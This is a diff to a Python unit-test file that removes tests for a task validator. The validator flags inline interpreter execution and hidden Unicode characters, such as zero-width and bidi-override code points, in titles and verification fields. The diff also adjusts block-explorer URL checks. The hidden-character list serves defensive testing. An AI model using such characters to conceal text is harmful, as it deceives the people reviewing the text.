-                t = base | ({'steps': [text]} if field == 'steps' else {field: text})
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), (field, text))
-            for t in (self._task(sandbox='Work in a clean sandbox without secrets. ' + text),
-                      self._task(run=[{'cmd': 'python3 tool.py', 'then': text}])):
-                self.assertTrue(any('inline code execution' in e for e in cv2.code_safety_errors(t)), text)
-        # fail closed by design: prose with an interpreter name and a pipe or "<" in one field is rejected too
-        for text in ('Python | fine', 'The ruby page lists a < b'):
-            self.assertTrue(cv2.inline_exec(text), text)
-        # a pipe or redirect without an interpreter, and evaluate/executor words, pass
-        for text in ('Check it with `sha256sum -c` | read the output', 'Open the page < 1 minute', 'Evaluate the result',
-                     'The executor prints OK', 'Read the medieval page', 'Run `python3 tool.py --selftest`'):
-            self.assertFalse(cv2.inline_exec(text), text)
-
-    def test_published_first_tasks_still_pass(self):
-        tasks = cv2.load_first_tasks()
-        self.assertTrue(tasks)
-        for slug, t in tasks.items():
-            self.assertEqual(cv2.code_safety_errors(t), [], slug)
-            texts = [*(t.get('steps') or []), t['code']['sandbox'], *[r.get('then', '') for r in t['code']['run']]] if t.get('code') else []
-            texts += [t.get(k) or '' for k in cv2.TEXT_FIELDS]
-            self.assertFalse(any(cv2.inline_exec(x) for x in texts), slug)
-
-    def test_hidden_unicode_in_title_and_verification(self):
-        base = {k: v for k, v in self._task().items() if k != 'code'}
-        for field in ('title', 'verification'):
-            for ch in ('\u2028', '\u2029', '\u0085', '\u200b', '\u200d', '\u2060', '\ufeff', '\u202e', '\u2066'):
-                errs = cv2.code_safety_errors(base | {field: 'Check the clock' + ch + 'now'})
-                self.assertTrue(any('Unicode line separators' in e for e in errs), (field, repr(ch)))
-        self.assertEqual(cv2.code_safety_errors(base | {'title': 'Check the clock', 'verification': 'Ran to exit code 0'}), [])
+            self.assertTrue(cv2.validate_first_tasks({'touchstone': t}, set(CARDS)), why)  # must not raise
 
     def test_explorer_urls_without_userinfo_or_port(self):
         addr = '/address/0x' + 'f' * 40
@@ -593,10 +438,10 @@ class FirstTask(unittest.TestCase):
                     'https://basescan.org:444' + addr, 'https://basescan.org:443' + addr, 'https://basescan.org:' + addr):
             self.assertFalse(cv2.contract_url_ok(bad), bad)
             self.assertFalse(cv2.explorer_host(bad), bad)
-            self.assertNotEqual(cv2.source_level(bad), 3, bad)
-            self.assertNotEqual(cv2.source_level(bad.replace(addr, '/tx/' + TX)), 3, bad)
+            self.assertFalse(cv2.record_url_ok(bad), bad)
+            self.assertFalse(cv2.record_url_ok(bad.replace(addr, '/tx/' + TX)), bad)
         self.assertTrue(cv2.contract_url_ok('https://basescan.org' + addr))
-        self.assertEqual(cv2.source_level('https://basescan.org/tx/' + TX), 3)
+        self.assertEqual(cv2.source_level('https://basescan.org/tx/' + TX), 2)
 
 
 class Wording(unittest.TestCase):
